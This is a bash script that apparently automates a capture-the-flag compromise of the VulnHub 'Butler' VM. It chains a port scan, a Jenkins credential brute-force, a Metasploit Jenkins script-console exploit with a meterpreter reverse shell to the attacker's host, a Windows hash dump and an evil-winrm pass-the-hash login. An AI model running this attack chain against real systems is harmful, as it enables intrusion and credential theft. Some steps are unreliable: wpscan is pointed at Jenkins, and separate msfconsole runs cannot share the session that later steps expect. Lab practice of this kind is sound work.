#!/usr/bin/env bash
# root-butler.sh
# Authorized security-lab automation for the VulnHub "Butler" VM
# Use only in isolated, permission-based environments.

set -e
TARGET="192.168.56.103"          # Change to Butler IP
LHOST=$(ip route get 1 | awk '{print $7}' | head -1)
JENKINS_PORT="8080"

echo "[INFO] 1. Add host entry for Butler"
grep -q "$TARGET butler" /etc/hosts || echo "$TARGET butler" | sudo tee -a /etc/hosts

echo "[INFO] 2. Port scan (TCP full)"
nmap -sV -sC -p- butler -oN butler-recon.txt

echo "[INFO] 3. Jenkins brute-force against default creds"
# Common weak credentials: admin/admin, jenkins/jenkins
cewl http://butler:${JENKINS_PORT} -w wordlist.txt
wpscan --url http://butler:${JENKINS_PORT} -U jenkins -P wordlist.txt --no-banner > wpscan-results.txt

echo "[INFO] 4. Open Metasploit listener for Jenkins Script Console"
msfconsole -q -x "
  use exploit/multi/http/jenkins_script_console
  set RHOSTS butler
  set RPORT ${JENKINS_PORT}
  set LHOST ${LHOST}
  set payload java/meterpreter/reverse_tcp
  exploit -z
"

echo "[INFO] 5. Background session & migrate"
msfconsole -q -x "
  sessions -i 1
  migrate -N explorer.exe
  background
"

echo "[INFO] 6. Dump hashes for WinRM login"
msfconsole -q -x "
  use post/windows/gather/hashdump
  set SESSION 1
  run
  exit
"

echo "[INFO] 7. Connect via WinRM with Administrator hash"
echo "       Run: evil-winrm -i butler -u Administrator -H <hash_from_dump>"
echo "[INFO] 8. Confirm SYSTEM with: whoami /priv"
echo "[INFO] 9. Flag location: C:\\Users\\Administrator\\Desktop\\root.txt"
